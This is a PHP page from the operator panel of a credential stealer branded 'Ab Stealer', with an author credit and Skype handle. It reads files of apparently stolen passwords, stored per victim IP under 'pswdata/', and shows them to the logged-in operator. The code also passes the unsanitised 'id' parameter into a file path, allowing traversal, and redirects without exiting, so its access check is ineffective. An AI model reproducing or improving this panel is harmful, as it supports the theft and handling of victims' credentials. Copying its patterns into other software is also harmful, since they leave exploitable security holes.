<?php
session_start();
if (isset($_SESSION['login'])) {
    if ($_SESSION['login'] == '0') {
        header("location: index.php");
    }
} else {
    header('location: index.php');
}
if (isset($_GET['id'])) {
    $FileName = 'pswdata/ip-'.$_GET['id'].'.txt';
    if (file_exists($FileName)) {
        $myfile = fopen($FileName, "r") or die("Unable to open file!");
?>
<html>
    <head>
        <title>Ab Stealer</title>
        <link type="text/css" rel="stylesheet" href="style.css" >
        <script src="https://use.fontawesome.com/ef7ebb85cf.js"></script>
    </head>
    <body>
        <section class="logo">
            <img src="img/Logo.png">
            <section class="button">
                <a href="index.php" id="a1"><i class="fa fa-arrow-home" aria-hidden="true"></i>&nbsp;Home</a>
                <a href="logout.php" id="a2"><i class="fa fa-sign-out" aria-hidden="true"></i>&nbsp;Logout</a>
            </section>
        </section>
        <section class="TextFile">
            <textarea><?php while(!feof($myfile)) { echo fgets($myfile) . ""; } ?></textarea>
        </section>
        <section class="about">
            <i class="fa fa-user" aria-hidden="true"></i> &nbspCreate By : <h>KingDomSc</h> , Skype : <h>KingDomSc</h> .
        </section>
    </body>
</html>
<?php
        fclose($myfile);
    } else {
        header('location: index.php');
    }
} else {
    header('location: index.php');
}
?>